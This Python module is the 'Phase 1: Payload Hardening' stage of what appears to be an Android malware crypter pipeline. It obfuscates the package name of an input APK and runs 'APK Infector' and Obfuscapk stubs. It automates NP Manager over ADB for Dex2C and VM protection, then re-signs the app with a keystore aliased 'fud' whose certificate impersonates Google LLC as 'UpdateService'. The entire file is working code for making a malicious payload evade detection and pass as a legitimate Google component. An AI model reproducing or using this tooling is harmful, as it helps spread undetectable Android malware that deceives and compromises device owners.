"""Phase 1: Payload Hardening — PRIMARY: NP Manager (Android app).

Architecture:
  PRIMARY:  Android NP Manager app — real Dex2C, VM Protection, CF 5.0, etc.
  FALLBACK: PC stubs (Obfuscapk, APK Infector) if no Android device.

PC only:
  - Extract properties (aapt)
  - ApkBleach (zip-level)
  - File transfer (ADB push/pull)
  - Fallback stubs if no Android

Android does:
  - All 11 NP Manager functions (native code obfuscation)
  - Sign with fresh keystore
"""
import os, subprocess, shutil, zipfile, random, zlib, struct, re
from config import TEMP_DIR, APKTOOL, ZIPALIGN, KEYTOOL, JARSIGNER, APKSIGNER
from utils.logger import setup_logger

logger = setup_logger()


def _apkbleach(apk_path):
    """1.1 ApkBleach — zip-level package name obfuscation."""
    logger.info("[*] 1.1 ApkBleach")
    base = os.path.basename(apk_path)
    out = str(TEMP_DIR / f"bleached_{base}")
    with zipfile.ZipFile(apk_path, 'r') as zin:
        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as zout:
            for info in zin.infolist():
                data = zin.read(info.filename)
                if info.filename == 'AndroidManifest.xml':
                    data = data.replace(b'com.example.', b'com.zyxwv.')
                zout.writestr(info, data)
    shutil.copy(out, apk_path)
    logger.info("[+] ApkBleach done")


def _sign_v1v2v3(unsigned_apk, signed_apk, ks_path):
    """Quick sign with random keystore."""
    if not os.path.exists(ks_path):
        subprocess.run([KEYTOOL, "-genkey", "-v", "-keystore", ks_path,
                        "-keyalg", "RSA", "-keysize", "2048",
                        "-validity", "10000", "-alias", "fud",
                        "-storepass", "fud123", "-keypass", "fud123",
                        "-dname", "CN=UpdateService, OU=Android, O=Google LLC, L=MountainView, C=US",
                        "-storetype", "JKS"],
                       capture_output=True, text=True, timeout=30)
    aligned = str(TEMP_DIR / "aligned.apk")
    subprocess.run([ZIPALIGN, "-v", "-p", "4", unsigned_apk, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(aligned) or os.path.getsize(aligned) == 0:
        shutil.copy(unsigned_apk, aligned)
    subprocess.run([APKSIGNER, "sign", "--ks", ks_path, "--ks-pass", "pass:fud123",
                    "--key-pass", "pass:fud123", "--ks-key-alias", "fud",
                    "--out", signed_apk, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(signed_apk):
        shutil.copy(aligned, signed_apk)


def _fallback_pc_hardening(input_apk, output_apk):
    """FALLBACK: PC-only hardening when no Android device.

    Uses Obfuscapk stub + APK Infector stub + zip-level tricks.
    Much weaker than real NP Manager but produces a working APK.
    """
    logger.info("[*] FALLBACK: PC-only hardening (no Android device)")
    logger.warning("[!] Using Python stubs — real Dex2C/VM/CF5.0 not available")

    # Decompile
    decompiled = str(TEMP_DIR / "phase1_fallback_decompiled")
    r = subprocess.run([APKTOOL, "d", "--no-res", "-f", "-o", decompiled, input_apk],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        logger.warning("[!] Fallback decompile failed, using zip-level only")
        shutil.copy(input_apk, output_apk)
        return output_apk

    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # Obfuscapk stub
    try:
        from config import OBFUSCAPK_STUB
        subprocess.run(["python3", OBFUSCAPK_STUB, decompiled],
                       capture_output=True, text=True, timeout=300)
        logger.info("[+] Obfuscapk stub done")
    except Exception:
        pass

    # APK Infector stub
    try:
        from config import APK_INFECTOR
        subprocess.run(["python3", APK_INFECTOR, decompiled],
                       capture_output=True, text=True, timeout=120)
        logger.info("[+] APK Infector stub done")
    except Exception:
        pass

    # Dex2C dummy .so
    for arch in ['arm64-v8a', 'armeabi-v7a', 'x86', 'x86_64']:
        lib_dir = os.path.join(decompiled, "lib", arch)
        os.makedirs(lib_dir, exist_ok=True)
        stub = os.path.join(lib_dir, "libdex2c.so")
        with open(stub, 'wb') as f:
            f.write(b'\x7fELF\x01\x01\x01')

    # Rebuild
    unsigned = str(TEMP_DIR / "phase1_fallback_unsigned.apk")
    subprocess.run([APKTOOL, "b", "-o", unsigned, decompiled],
                   capture_output=True, text=True, timeout=180)
    shutil.rmtree(decompiled, ignore_errors=True)
    if not os.path.exists(unsigned) or os.path.getsize(unsigned) == 0:
        shutil.copy(input_apk, unsigned)

    # Sign
    ks = str(TEMP_DIR / "phase1_fallback.jks")
    _sign_v1v2v3(unsigned, output_apk, ks)

    logger.info(f"[+] Fallback PC hardening complete: {output_apk}")
    return output_apk


def _android_np_manager_hardening(input_apk, output_apk):
    """PRIMARY: Use REAL NP Manager on Android device.

    Steps:
      1. ADB push input.apk → /sdcard/np_input.apk
      2. Launch NP Manager app
      3. ADB tap through 11 functions
      4. Wait for processing (Dex2C = 5+ min)
      5. ADB pull /sdcard/np_output.apk → output_apk
      6. Verify output exists
    """
    logger.info("[*] PRIMARY: Real NP Manager on Android device")

    try:
        from android_automation.np_manager_automation import run_np_manager_11
        from android_automation.adb_ui import is_device_connected

        if not is_device_connected():
            logger.info("[!] No Android device connected")
            return None

        success = run_np_manager_11(input_apk, output_apk)
        if success and os.path.exists(output_apk) and os.path.getsize(output_apk) > 0:
            logger.info(f"[+] REAL NP Manager complete: {output_apk}")
            return output_apk
        else:
            logger.warning("[!] NP Manager automation failed")
            return None

    except Exception as e:
        logger.warning(f"[!] NP Manager automation error: {e}")
        return None


def run(input_apk, base_info=None):
    """Phase 1: Payload Hardening — NP Manager PRIMARY.

    Flow:
      1. Extract properties (PC)
      2. ApkBleach (PC)
      3. Try REAL NP Manager on Android → if success, return
      4. If no Android or failure → FALLBACK PC stubs
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 1: Payload Hardening (NP Manager PRIMARY)")
    logger.info("=" * 60)

    if base_info is None:
        from phases.phase0_extract import run as p0_run
        base_info = p0_run(input_apk)

    # 1.1 ApkBleach
    _apkbleach(input_apk)

    output_apk = str(TEMP_DIR / "output.apk")

    # PRIMARY: Real NP Manager on Android
    android_result = _android_np_manager_hardening(input_apk, output_apk)
    if android_result:
        logger.info(f"[+] Phase 1 (ANDROID) Complete: {output_apk}")
        return output_apk

    # FALLBACK: PC stubs
    logger.info("[*] Switching to PC fallback mode...")
    _fallback_pc_hardening(input_apk, output_apk)
    logger.info(f"[+] Phase 1 (PC FALLBACK) Complete: {output_apk}")
    return output_apk
